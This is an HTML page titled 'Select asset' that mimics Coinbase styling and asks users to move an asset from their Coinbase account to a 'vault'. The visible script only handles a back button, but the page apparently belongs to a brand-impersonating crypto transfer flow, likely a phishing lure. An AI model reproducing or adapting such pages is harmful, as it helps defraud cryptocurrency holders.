<!doctype html>
<html lang="en" class="dark" style="color-scheme: dark;">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Select asset</title>
<link rel="stylesheet" href="/_next/static/css/68165cb776a47886.css">
<link rel="stylesheet" href="/_next/static/css/97cc91616cea400d.css">
<style>
.vm{min-height:100vh;background:#000;color:#fff;font-family:'CoinbaseSansFont',system-ui,sans-serif;max-width:480px;margin:0 auto;display:flex;flex-direction:column}
.vm-hd{display:flex;align-items:center;gap:12px;padding:16px 20px;border-bottom:1px solid #1f2937}
.vm-back{background:none;border:0;color:#fff;padding:4px;cursor:pointer}
.vm-body{flex:1;padding:20px}
.vm-sub{color:#94a3b8;font-size:15px;line-height:1.5;margin:0 0 20px}
.vm-list{border-top:1px solid #1f2937}
.vm-row{display:flex;align-items:center;gap:12px;padding:16px 0;border-bottom:1px solid #1f2937;cursor:pointer;width:100%;background:none;border-left:0;border-right:0;border-top:0;color:inherit;text-align:left;font-family:inherit}
.vm-row:disabled{opacity:.5;cursor:wait}
.vm-row img{width:40px;height:40px;border-radius:50%;flex-shrink:0}
.vm-row-info{flex:1;min-width:0;display:flex;flex-direction:column;gap:4px}
.vm-row-name{font-size:16px;font-weight:600;display:flex;align-items:center;gap:8px}
.vm-badge{background:#1f2937;color:#94a3b8;font-size:11px;padding:2px 8px;border-radius:4px;font-weight:500}
.vm-row-stats{display:flex;align-items:center;gap:10px;font-size:13px}
.vm-row-price{color:#e2e8f0}
.vm-row-chg{font-size:12px}
.vm-row-chg.neg{color:#f87171}
.vm-row-chg.pos{color:#4ade80}
.vm-chev{color:rgb(87,139,250);flex-shrink:0}
</style>
</head>
<body style="margin:0">
<div class="vm">
  <header class="vm-hd">
    <button type="button" class="vm-back" id="rv-back" aria-label="Back"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M19 12H5M12 19l-7-7 7-7"/></svg></button>
    <h1 style="margin:0;font-size:17px;font-weight:600">Select asset</h1>
  </header>
  <div class="vm-body">
    <p class="vm-sub">Select the asset you'd like to transfer from your Coinbase account to your vault.</p>
    <div
      id="rv-market-host"
      data-rv-coin-market="single"
      data-rv-market-list="rv-asset-list"
      hidden
      aria-hidden="true"
    ></div>
    <div class="vm-list" id="rv-asset-list"></div>
  </div>
</div>
<script>
document.getElementById('rv-back').addEventListener('click', function () {
  if (history.length > 1) history.back();
  else location.href = '/coinbase/transfer-coinbase';
});
</script>
</body>
</html>
